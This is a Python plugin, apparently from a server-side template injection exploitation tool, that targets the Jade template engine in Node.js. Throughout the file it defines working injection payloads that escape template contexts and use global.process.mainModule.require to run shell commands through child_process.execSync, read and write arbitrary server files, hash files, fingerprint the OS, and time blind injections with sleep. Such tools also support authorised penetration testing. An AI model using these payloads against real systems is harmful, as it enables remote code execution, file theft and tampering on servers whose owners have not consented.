from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import closures
from core.plugin import Plugin
from utils import rand
import base64

class Jade(Plugin):

    actions = {
        'render' : {
            'render': '\n= %(code)s\n',
            'header': '\n= %(header)s\n',
            'trailer': '\n= %(trailer)s\n'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk)s', 'base64')""",
            'truncate' : """global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
        },
        'read' : {
            'call': 'render',
            'read' : """global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'inject',
            'md5': """- var x = global.process
- x = x.mainModule.require
= x('crypto').createHash('md5').update(x('fs').readFileSync('%(path)s')).digest("hex")
"""
        },
        'evaluate' : {
            'call': 'inject',
            'evaluate': '- %(code)s'
        },
        'blind' : {
            'call': 'execute',
            'blind': """sleep %(delay)i"""
        },
        'execute' : {
            'call': 'render',
            'execute': """= global.process.mainModule.require('child_process').execSync("%(code)s")"""
        }

    }

    contexts = [
    
        # Text context, no closures
        { 'level': 1 },

        # Attribute close a(href=\'%s\')
        { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: closures.javascript_ctx_closures[1] } },
        # String interpolation #{
        { 'level': 2, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : closures.javascript_ctx_closures },
        # Code context
        { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : closures.javascript_ctx_closures },
    ]

    def detect_engine(self):

        execution_code = """= global.process.mainModule.require('os').platform()"""
        self.set('os', self.render(execution_code))
        self.set('language', 'javascript')
        self.set('eval', 'javascript')
        self.set('engine', 'jade')

    def execute(self, code):
        # Quote code before submitting it
        return super(Jade, self).execute(quote(code))